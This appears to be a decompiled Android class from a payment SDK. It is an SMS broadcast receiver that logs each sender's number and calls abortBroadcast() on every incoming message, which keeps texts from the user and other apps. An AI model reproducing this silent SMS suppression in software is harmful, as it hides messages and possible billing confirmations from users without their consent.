package com.uc.paymentsdk.payment.sms.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
   public SmsReceiver() {
      super();
   }

   public void onReceive(Context var1, Intent var2) {
      Bundle var4 = var2.getExtras();
      if (var4 != null) {
         Object[] var6 = (Object[])var4.get("pdus");

         for(int var3 = 0; var3 < var6.length; ++var3) {
            String var5 = SmsMessage.createFromPdu((byte[])var6[var3]).getOriginatingAddress();
            Log.i("pay", "receiver number:" + var5);
            this.abortBroadcast();
         }
      }

   }
}
